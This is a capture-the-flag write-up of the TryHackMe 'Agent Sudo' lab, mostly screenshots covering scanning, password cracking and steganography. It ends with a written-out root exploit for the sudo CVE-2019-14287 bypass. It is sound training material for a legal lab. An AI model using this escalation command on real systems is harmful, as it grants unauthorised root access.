---
title: "TryHackMe: Agent Sudo"
layout: archive
date:   2020-01-20
tags: TryHackMe
tags_label: true
---
This a great box for beginners available on tryhackme. A bit puzzle-y but it covers all basic skills: scanning, password cracking, stego

This is an older writeup, so the format is very messed up. 

### Scanning:

Initial scan to find the machine on the network

![](/assets/images/1/s1.png)

Full scan to get details about running services

![](/assets/images/1/s2.png)

### Web:

Enumerate the server:

![](/assets/images/1/s3.png)

Check index.php

![](/assets/images/1/s4.png)

#### Create request for each possible codename as User-Agent:

##### Loop through the alphabet sending a request for each letter:

![](/assets/images/1/s5.png)

In curl\_out.txt:

![](/assets/images/1/s7.png)

### FTP:

**Trying to get the password for chris for ftp:**

![](/assets/images/1/s8.png)

**Logging into FTP for user chris:**

![](/assets/images/1/s9.png)

Download all the files:

![](/assets/images/1/s10.png)

Downloaded files:

*   To\_agentJ.txt

*   cute-alien.jpg

*   cutie.png

**Checking To\_agentJ.txt:**

![](/assets/images/1/s11.png)

### Stego:

Checking the two /assets/images for hidden files or text:

![](/assets/images/1/s12.png) ![](/assets/images/1/s13.png)

Retrieving hidden files from cutie.png using binwalk:

![](/assets/images/1/s21.png)

Using zip2john to get the hash for the encrypted archive:

![](/assets/images/1/s22.png)

Cracking the hash for the encrypted archive:

![](/assets/images/1/s23.png)

Viewing the contents of the archive:

![](/assets/images/1/s24.png)

Cracking the steghide password for the other image:

![](/assets/images/1/s25.png)
![](/assets/images/1/s26.png)

The extracted file:

![](/assets/images/1/s27.png)

### User:

Login to SSH:

![](/assets/images/1/s28.png)

#### User Flag:

![](/assets/images/1/s29.png)

### Root:

Copy the image Alien\_autospy.jpg to local machine:

![](/assets/images/1/s210.png)

**(BONUS) Found the source of the image using Tiny Eye:**

Tiny Eye -> Fox News -> Roswell alien autopsy

Checking if james can run anything with elevated privileges using sudo -l:

![](/assets/images/1/s211.png)

#### sudo priv esc:

This version of sudo is vulnerable to sudo 1.8.27 - Security Bypass (CVE-2019-14287) (https://www.exploit-db.com/exploits/47502)

![](/assets/images/1/s213.png)

Command:
```
sudo -u \#$((0xffffffff)) /bin/bash
```
Running the command:

![](/assets/images/1/s214.png)

#### Root Flag:

![](/assets/images/1/s215.png)

Fin.